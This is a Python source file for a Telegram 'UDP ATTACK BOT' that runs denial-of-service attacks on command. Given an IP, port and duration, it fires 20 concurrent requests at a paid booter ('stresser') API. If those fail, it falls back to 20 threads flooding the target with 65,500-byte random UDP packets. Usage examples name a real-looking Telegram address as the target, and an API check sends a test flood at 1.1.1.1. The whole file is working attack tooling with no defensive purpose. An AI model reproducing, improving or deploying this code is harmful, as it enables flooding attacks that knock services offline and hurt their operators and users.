# app.py - WORKING VERSION WITH API (Railway Compatible)
import os
import logging
import asyncio
import threading
import aiohttp
import socket
import time
from datetime import datetime
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 20

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== DIRECT UDP ATTACK (FALLBACK) =====
def udp_direct(target, port, duration, attack_id):
    """Direct UDP flood - Works without API"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        
        end_time = time.time() + duration
        packets_sent = 0
        
        while time.time() < end_time:
            try:
                payload = os.urandom(65500)
                sock.sendto(payload, (target, port))
                packets_sent += 1
                if packets_sent % 1000 == 0:
                    logger.info(f"Attack {attack_id}: Sent {packets_sent} packets")
            except:
                pass
        
        sock.close()
        return packets_sent
    except Exception as e:
        logger.error(f"Attack {attack_id} failed: {e}")
        return 0

# ===== API ATTACK =====
async def api_attack(target, port, duration, attack_id):
    """Send attack via API - This worked on Railway"""
    url = "https://api.susstresser.com/panel/api/api.php"
    
    # Try different methods that worked before
    methods = ["udp", "telegramvc"]
    
    for method in methods:
        params = {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": method
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        }
        
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url, params=params, headers=headers) as response:
                    if response.status == 200:
                        logger.info(f"✅ API Attack {attack_id} SUCCESS with method {method}")
                        return {
                            "success": True,
                            "method": method,
                            "status": response.status
                        }
        except Exception as e:
            logger.error(f"API Attack {attack_id} failed: {e}")
            continue
    
    return {"success": False, "method": "failed"}

# ===== 20 CONCURRENT ATTACKS =====
async def start_20_attacks(target, port, duration):
    """Launch 20 concurrent attacks using API first, fallback to direct UDP"""
    logger.info(f"🔥 Starting 20 concurrent attacks on {target}:{port} for {duration}s")
    
    # Try API first
    api_tasks = []
    for i in range(1, 21):
        task = api_attack(target, port, duration, i)
        api_tasks.append(task)
    
    api_results = await asyncio.gather(*api_tasks)
    api_success = sum(1 for r in api_results if r.get('success', False))
    
    logger.info(f"API Success: {api_success}/20")
    
    # If API fails, use direct UDP
    if api_success < 10:
        logger.info("⚠️ Low API success, using direct UDP...")
        
        # Run direct UDP attacks in threads
        direct_results = []
        threads = []
        
        for i in range(1, 21):
            t = threading.Thread(target=lambda i=i: direct_results.append((i, udp_direct(target, port, duration, i))))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        total_packets = sum(r[1] for r in direct_results)
        logger.info(f"✅ Direct UDP complete! Total packets: {total_packets}")
        
        return {
            "success": total_packets > 0,
            "total_packets": total_packets,
            "method": "direct_udp",
            "api_success": api_success
        }
    
    return {
        "success": True,
        "total_packets": 0,
        "method": "api",
        "api_success": api_success
    }

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")],
    ]
    if update.effective_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("🔬 CHECK API", callback_data="check_api")])
    
    await update.message.reply_text(
        "⚡ *UDP ATTACK BOT*\n\n"
        "🔥 20 Concurrent UDP Attacks\n"
        "📦 Packet Size: 65,500 bytes\n"
        "💪 API + Direct UDP\n\n"
        "Send: `/attack IP PORT TIME`\n"
        "Example: `/attack 91.108.13.37 32001 60`\n\n"
        "⏱️ Time: 60-300 seconds",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can use /attack.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ Usage: `/attack IP PORT TIME`\n"
            "Example: `/attack 91.108.13.37 32001 60`",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n"
            f"📦 Packet: `65,500 bytes`\n\n"
            f"⏳ Sending attacks...",
            parse_mode='Markdown'
        )
        
        result = await start_20_attacks(target, port, duration)
        
        if result.get('success'):
            if result.get('method') == 'api':
                response_text = (
                    f"✅ *ATTACK SUCCESSFUL!*\n\n"
                    f"🎯 Target: `{target}`\n"
                    f"📡 Port: `{port}`\n"
                    f"⏱️ Time: `{duration}s`\n"
                    f"📊 Method: API\n"
                    f"✅ API Success: `{result.get('api_success', 0)}/20`\n"
                    f"⚡ Attacks: `20 CONCURRENT`\n"
                    f"📊 Status: ✅ SUCCESS"
                )
            else:
                response_text = (
                    f"✅ *ATTACK SUCCESSFUL!*\n\n"
                    f"🎯 Target: `{target}`\n"
                    f"📡 Port: `{port}`\n"
                    f"⏱️ Time: `{duration}s`\n"
                    f"📊 Method: Direct UDP\n"
                    f"📦 Packets Sent: `{result.get('total_packets', 0):,}`\n"
                    f"⚡ Attacks: `20 CONCURRENT`\n"
                    f"📊 Status: ✅ SUCCESS"
                )
        else:
            response_text = (
                f"❌ *ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Status: ❌ FAILED"
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    except ValueError:
        await update.message.reply_text("❌ Invalid port or time! Use numbers.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "💥 *ATTACK*\n\n"
        "Send: `IP PORT TIME`\n"
        "Example: `91.108.13.37 32001 60`\n\n"
        "⏱️ Time: 60-300 seconds\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can attack.")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n\n"
            f"⏳ Sending attacks...",
            parse_mode='Markdown'
        )
        
        result = await start_20_attacks(target, port, duration)
        
        if result.get('success'):
            if result.get('method') == 'api':
                response_text = (
                    f"✅ *ATTACK SUCCESSFUL!*\n\n"
                    f"🎯 Target: `{target}`\n"
                    f"📡 Port: `{port}`\n"
                    f"⏱️ Time: `{duration}s`\n"
                    f"📊 Method: API\n"
                    f"✅ API Success: `{result.get('api_success', 0)}/20`\n"
                    f"📊 Status: ✅ SUCCESS"
                )
            else:
                response_text = (
                    f"✅ *ATTACK SUCCESSFUL!*\n\n"
                    f"🎯 Target: `{target}`\n"
                    f"📡 Port: `{port}`\n"
                    f"⏱️ Time: `{duration}s`\n"
                    f"📊 Method: Direct UDP\n"
                    f"📦 Packets Sent: `{result.get('total_packets', 0):,}`\n"
                    f"📊 Status: ✅ SUCCESS"
                )
        else:
            response_text = (
                f"❌ *ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Status: ❌ FAILED"
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📊 *BOT STATUS*\n\n"
        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
        f"📦 Packet Size: 65,500 bytes\n"
        f"🌐 Status: ONLINE\n"
        f"🔑 API: {'✅ Configured' if API_KEY else '❌ No Key'}\n\n"
        f"📌 /attack IP PORT TIME",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def check_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        await query.answer("Access denied!", show_alert=True)
        return
    
    await query.edit_message_text("🔬 Testing API connection...")
    
    url = f"https://api.susstresser.com/panel/api/api.php?key={API_KEY}&host=1.1.1.1&port=80&time=10&method=udp"
    
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as response:
                text = await response.text()
                
                await query.edit_message_text(
                    f"🔬 *API TEST RESULTS*\n\n"
                    f"📡 Status: {response.status}\n"
                    f"🔑 API Key: {API_KEY[:10]}...{API_KEY[-4:] if len(API_KEY) > 14 else ''}\n"
                    f"📝 Response: {text[:200]}\n\n"
                    f"{'✅ API is responding!' if response.status == 200 else '❌ API Error!'}",
                    parse_mode='Markdown',
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
                )
    except Exception as e:
        await query.edit_message_text(
            f"❌ *API ERROR*\n\n{str(e)}",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
        )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")],
    ]
    if query.from_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("🔬 CHECK API", callback_data="check_api")])
    
    await query.edit_message_text(
        "⚡ *UDP ATTACK BOT*\n\n"
        "🔥 20 Concurrent UDP Attacks\n"
        "📦 Packet Size: 65,500 bytes\n"
        "💪 API + Direct UDP\n\n"
        "Send: `/attack IP PORT TIME`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== RUN BOT =====
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(status_callback, pattern="^status$"))
    app.add_handler(CallbackQueryHandler(check_api_callback, pattern="^check_api$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ Bot started!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("⚡ UDP ATTACK BOT")
    print("🔥 20 Concurrent Attacks")
    print("📦 Packet Size: 65,500 bytes")
    print("💪 API + Direct UDP")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)